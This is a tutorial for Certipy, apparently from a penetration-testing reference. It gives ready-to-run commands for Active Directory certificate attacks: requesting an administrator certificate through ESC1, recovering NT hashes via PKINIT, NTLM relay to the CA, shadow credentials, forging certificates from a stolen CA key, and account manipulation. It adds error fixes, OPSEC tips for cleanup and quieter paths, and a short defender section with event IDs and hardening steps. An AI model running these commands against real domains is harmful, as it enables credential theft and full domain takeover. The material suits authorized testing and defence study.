# Certipy — full tutorial

`certipy` is the AD CS attack toolkit. Replaces the older `Certify.exe` + `ForgeCert` chain with a single Python tool. Implements every published ESC1–ESC15 path plus ticket forging and shadow-credentials.

## Install

```terminal
pipx install certipy-ad
```

## Subcommands

| Cmd | Purpose |
|-----|---------|
| `find` | Enumerate CAs + templates + ESC# heuristics |
| `req` | Request a certificate |
| `auth` | Authenticate via cert (PKINIT) → NT hash + TGT |
| `account` | Manipulate target user (UPN, altSecurityIdentities, etc.) |
| `template` | Read / write template configuration (ESC4) |
| `ca` | Manage CA (officers, enable templates) (ESC7) |
| `relay` | NTLM relay → AD CS (ESC8/11) |
| `forge` | Forge cert from compromised CA private key (ESC12) |
| `cert` | Local cert manipulation (PFX ↔ PEM, etc.) |
| `shadow` | Shadow Credentials attack |
| `kerberoast` | Roast service tickets via certipy |

## Authentication shape

```terminal
-u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1
-u alice@corp.local -hashes :5e5a04... -dc-ip 10.0.0.1
-pfx alice.pfx -dc-ip 10.0.0.1
-k -no-pass -dc-ip 10.0.0.1     # from KRB5CCNAME
```

## Workflows

### Enumerate everything vulnerable

```terminal
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout
```

`-vulnerable` filters output to ESC#-flagged templates. `-stdout` prints; without it, files are written.

### ESC1 — request cert "as" admin

```terminal
certipy req -u alice@corp.local -p 'Pass1' \
  -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local
```

### Authenticate with the cert → get NT hash

```terminal
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC8 — NTLM relay to AD CS web

```terminal
certipy relay -target http://CA -template DomainController
# Then trigger a coercion: PetitPotam.py / coercer.py
```

### Shadow Credentials (msDS-KeyCredentialLink abuse)

```terminal
certipy shadow auto -u alice@corp.local -p Pass1 -account victim
# Sets msDS-KeyCredentialLink on victim, returns its NT hash via PKINIT
```

### Forge from compromised CA key (ESC12)

```terminal
certipy forge -ca-pfx ca.pfx -upn administrator@corp.local
```

### Account manipulation (ESC9, ESC14)

```terminal
certipy account update -u alice -p Pass1 -user victim -upn administrator
```

## Common parameters

| Flag | Purpose |
|------|---------|
| `-ca <name>` | CA name |
| `-template <name>` | Template |
| `-upn <user>` | UPN for SAN (impersonation target) |
| `-dns <host>` | DNS SAN |
| `-sid <sid>` | SID security extension |
| `-application-policies <list>` | ESC15 application policy override |
| `-archive-key <file>` | Pull existing private key from CA archive |
| `-out <basename>` | Output basename for `.pfx` |
| `-debug` | Verbose |

## Good output

```
[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx administrator.pfx
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*]    NT hash: 5e5a04...
```

The NT hash → DCSync → golden ticket → end of forest.

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| `STATUS_ACCESS_DENIED` on `req` | Template requires Manager Approval, or you lack enroll rights |
| `KDC_ERR_CLIENT_NOT_TRUSTED` on `auth` | Strong cert mapping enforced + missing SID extension; supply `-sid` |
| `find -vulnerable` shows nothing | True least-priv environment — try shadow-credentials path |
| `relay` gets no callbacks | Coercion vector blocked; try `dfscoerce`/`coercer` |
| Cert valid but PKINIT fails | Certificate mapping = strong; need explicit `altSecurityIdentities` mapping |

## Defender's perspective

- **EID 4886 / 4887** on CA: certificate request / issuance with anomalous SAN.
- **EID 4624 type 9 (Kerberos cert logon)** within seconds of cert issuance.
- **EID 4768** TGT request with `Pre-auth not required` → PKINIT hint.
- Microsoft Defender for Identity has detections for ESC1 / ESC8.

Hardening:
- Enforce `StrongCertificateBindingEnforcement = 2` (registry).
- Disable HTTP enrollment, require HTTPS + EPA (ESC8).
- Manager-approval on any template that allows SAN-in-request.
- Audit `ManageCA` rights weekly.

## OPSEC

- Each `certipy req` writes a `.pfx` locally — clean up.
- Run from the operator box; doesn't need to be domain-joined.
- ESC1 is the loudest ESC because the SAN mismatch is logged. ESC13 (group-link OID) is quieter.

## Related

- **Certify.exe** — older C# version, Windows-side.
- **ForgeCert** — older C# silver-cert forging.
- **PassTheCert** — schannel-based PKINIT auth from Linux.
